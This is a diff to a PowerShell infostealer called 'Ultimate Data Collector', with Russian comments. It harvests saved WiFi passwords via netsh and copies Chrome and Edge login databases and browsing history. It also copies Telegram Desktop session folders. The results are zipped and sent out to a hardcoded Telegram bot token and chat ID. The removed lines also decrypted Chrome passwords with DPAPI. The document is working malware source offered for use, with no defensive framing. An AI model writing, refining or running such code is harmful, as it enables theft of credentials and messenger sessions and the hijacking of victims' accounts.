@@ -1,15 +1,24 @@
 <#
 .SYNOPSIS
-    Ultimate Data Collector - Максимальный сбор информации
+    Ultimate Data Collector - Автономная версия
 .DESCRIPTION
-    Собирает: пароли WiFi, логины/пароли из браузеров, историю, файлы мессенджеров
+    Собирает: WiFi пароли, данные браузеров, историю, файлы мессенджеров
 #>
 
 # Конфигурация Telegram
 $BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
 $CHAT_ID = "6525689863"
-$TEMP_DIR = "$env:TEMP\DataCollector_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
 New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null
+
+function Send-ToTelegram {
+    param([string]$Text)
+    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+    $body = @{ chat_id = $CHAT_ID; text = $Text }
+    try {
+        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
+    } catch { Write-Output "[!] Telegram error: $_" }
+}
 
 function Send-FileToTelegram {
     param([string]$FilePath)
@@ -36,21 +45,20 @@ function Send-FileToTelegram {
     } catch { Write-Output "[!] File send error: $_" }
 }
 
-# 1. Сбор паролей WiFi (исправленная версия)
+# 1. Сбор WiFi паролей (улучшенный метод)
 function Get-WiFiPasswords {
     $outputFile = "$TEMP_DIR\wifi_passwords.txt"
     $result = @("=== WiFi Passwords ===")
     
     try {
-        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
-            $_.Line.Split(":")[1].Trim()
+        $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
+            $_.Split(":")[1].Trim()
         }
         
         foreach ($profile in $profiles) {
             try {
-                $xml = netsh wlan export profile name=`"$profile`" key=clear folder="$TEMP_DIR"
-                $xmlFile = Get-ChildItem -Path "$TEMP_DIR\*$profile*.xml"
-                $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
+                $profileInfo = netsh wlan show profile name="$profile" key=clear
+                $password = ($profileInfo | Select-String "Key Content").Line.Split(":")[1].Trim()
                 
                 $result += "SSID: $profile"
                 $result += "Password: $password"
@@ -63,61 +71,28 @@ function Get-WiFiPasswords {
     return $outputFile
 }
 
-# 2. Сбор данных браузеров (Chrome, Edge, Opera)
-function Get-BrowserCredentials {
-    $outputFile = "$TEMP_DIR\browser_creds.txt"
-    $result = @("=== Browser Credentials ===")
+# 2. Сбор данных браузеров (без SQLite)
+function Get-BrowserData {
+    $outputFile = "$TEMP_DIR\browser_data.txt"
+    $result = @("=== Browser Data ===")
     
-    # Список браузеров для проверки
-    $browsers = @(
-        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" },
-        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" },
-        @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable\Login Data" }
-    )
+    # Chrome
+    try {
+        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromePath) {
+            $result += "Chrome: Found login data (manual extraction required)"
+            Copy-Item $chromePath "$TEMP_DIR\chrome_logindata" -Force
+        }
+    } catch { $result += "Chrome error: $_" }
     
-    foreach ($browser in $browsers) {
-        try {
-            if (Test-Path $browser.Path) {
-                $copyPath = "$TEMP_DIR\$($browser.Name)_LoginData"
-                Copy-Item -Path $browser.Path -Destination $copyPath -Force
-                
-                # Используем SQLite для извлечения данных
-                try {
-                    Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -ErrorAction Stop
-                    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-                    $conn.ConnectionString = "Data Source=$copyPath"
-                    $conn.Open()
-                    
-                    $command = $conn.CreateCommand()
-                    $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                    $adapter = New-Object -TypeName System.Data.SQLite.SQLiteDataAdapter $command
-                    $dataset = New-Object -ObjectTypeName System.Data.DataSet
-                    $adapter.Fill($dataset) | Out-Null
-                    
-                    foreach ($row in $dataset.Tables[0].Rows) {
-                        $result += "$($browser.Name) Credentials:"
-                        $result += "URL: $($row.origin_url)"
-                        $result += "Login: $($row.username_value)"
-                        
-                        # Дешифровка пароля (для Chrome)
-                        if ($browser.Name -eq "Chrome") {
-                            $passwordBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                                $row.password_value,
-                                $null,
-                                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-                            )
-                            $password = [System.Text.Encoding]::UTF8.GetString($passwordBytes)
-                            $result += "Password: $password"
-                        } else {
-                            $result += "Password: [ENCRYPTED]"
-                        }
-                        $result += "----------------"
-                    }
-                } catch { $result += "$($browser.Name) SQL error: $_" }
-                finally { if ($conn) { $conn.Close() } }
-            }
-        } catch { $result += "$($browser.Name) error: $_" }
-    }
+    # Edge
+    try {
+        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+        if (Test-Path $edgePath) {
+            $result += "Edge: Found login data (manual extraction required)"
+            Copy-Item $edgePath "$TEMP_DIR\edge_logindata" -Force
+        }
+    } catch { $result += "Edge error: $_" }
     
     $result -join "`n" | Out-File -FilePath $outputFile
     return $outputFile
@@ -128,61 +103,43 @@ function Get-BrowserHistory {
     $outputFile = "$TEMP_DIR\browser_history.txt"
     $result = @("=== Browser History ===")
     
-    $browsers = @(
-        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" },
-        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" }
-    )
+    # Chrome History
+    try {
+        $chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+        if (Test-Path $chromeHistoryPath) {
+            $result += "Chrome: History file copied"
+            Copy-Item $chromeHistoryPath "$TEMP_DIR\chrome_history" -Force
+        }
+    } catch { $result += "Chrome history error: $_" }
     
-    foreach ($browser in $browsers) {
-        try {
-            if (Test-Path $browser.Path) {
-                $copyPath = "$TEMP_DIR\$($browser.Name)_History"
-                Copy-Item -Path $browser.Path -Destination $copyPath -Force
-                
-                try {
-                    Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll"
-                    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-                    $conn.ConnectionString = "Data Source=$copyPath"
-                    $conn.Open()
-                    
-                    $command = $conn.CreateCommand()
-                    $command.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
-                    $reader = $command.ExecuteReader()
-                    
-                    while ($reader.Read()) {
-                        $result += "$($browser.Name) History:"
-                        $result += "URL: $($reader.GetString(0))"
-                        $result += "Title: $($reader.GetString(1))"
-                        $result += "Visits: $($reader.GetInt32(2))"
-                        $result += "Last Visit: $([DateTime]::FromFileTime($reader.GetInt64(3)))"
-                        $result += "----------------"
-                    }
-                } catch { $result += "$($browser.Name) history error: $_" }
-                finally { if ($conn) { $conn.Close() } }
-            }
-        } catch { $result += "$($browser.Name) error: $_" }
-    }
+    # Edge History
+    try {
+        $edgeHistoryPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+        if (Test-Path $edgeHistoryPath) {
+            $result += "Edge: History file copied"
+            Copy-Item $edgeHistoryPath "$TEMP_DIR\edge_history" -Force
+        }
+    } catch { $result += "Edge history error: $_" }
     
     $result -join "`n" | Out-File -FilePath $outputFile
     return $outputFile
 }
 
-# 4. Сбор файлов мессенджеров (Telegram, WhatsApp)
-function Get-MessengerFiles {
+# 4. Сбор файлов Telegram
+function Get-TelegramData {
     $result = @()
-    
-    # Telegram
-    $telegramPaths = @(
+    $paths = @(
         "$env:APPDATA\Telegram Desktop\tdata",
         "$env:USERPROFILE\Documents\Telegram Desktop\tdata"
     )
     
-    foreach ($path in $telegramPaths) {
+    foreach ($path in $paths) {
         if (Test-Path $path) {
-            $dest = "$TEMP_DIR\Telegram_Data"
-            New-Item -Path $dest -ItemType Directory -Force | Out-Null
-            Copy-Item -Path "$path\*" -Destination $dest -Recurse -Force
-            $result += "$dest\telegram_data.zip"
+            $dest = "$TEMP_DIR\Telegram_$([System.IO.Path]::GetFileName($path))"
+            try {
+                Copy-Item -Path $path -Destination $dest -Recurse -Force
+                $result += $dest
+            } catch { Write-Output "Telegram copy error: $_" }
         }
     }
     
@@ -193,25 +150,26 @@ function Get-MessengerFiles {
 try {
     # Собираем данные
     $wifiFile = Get-WiFiPasswords
-    $browserCredsFile = Get-BrowserCredentials
+    $browserFile = Get-BrowserData
     $historyFile = Get-BrowserHistory
-    $messengerFiles = Get-MessengerFiles
+    $telegramFiles = Get-TelegramData
     
-    # Архивируем все файлы
-    $zipFile = "$env:TEMP\CollectedData_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
-    Compress-Archive -Path @($wifiFile, $browserCredsFile, $historyFile) + $messengerFiles -DestinationPath $zipFile -Force
+    # Архивируем все
+    $zipFile = "$env:TEMP\Collected_Data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+    $filesToZip = @($wifiFile, $browserFile, $historyFile) + $telegramFiles | Where-Object { $_ -ne $null }
+    Compress-Archive -Path $filesToZip -DestinationPath $zipFile -Force
     
     # Отправляем архив
     Send-FileToTelegram -FilePath $zipFile
     
-    # Отправляем краткий отчет
+    # Краткий отчет
     $report = @(
-        "=== Data Collection Report ===",
-        "WiFi Passwords: $(if (Test-Path $wifiFile) {'Collected'} else {'Failed'})",
-        "Browser Credentials: $(if (Test-Path $browserCredsFile) {'Collected'} else {'Failed'})",
-        "Browser History: $(if (Test-Path $historyFile) {'Collected'} else {'Failed'})",
-        "Messenger Files: $(if ($messengerFiles.Count -gt 0) {$messengerFiles.Count} else {'None'})",
-        "Full data archive: $(Split-Path $zipFile -Leaf)"
+        "=== Data Collection Complete ===",
+        "WiFi Passwords: $(if (Test-Path $wifiFile) {'✔'} else {'✖'})",
+        "Browser Data: $(if (Test-Path $browserFile) {'✔'} else {'✖'})",
+        "Browser History: $(if (Test-Path $historyFile) {'✔'} else {'✖'})",
+        "Telegram Data: $(if ($telegramFiles.Count -gt 0) {'✔'} else {'✖'})",
+        "Archive: $(Split-Path $zipFile -Leaf)"
     ) -join "`n"
     
     Send-ToTelegram -Text $report
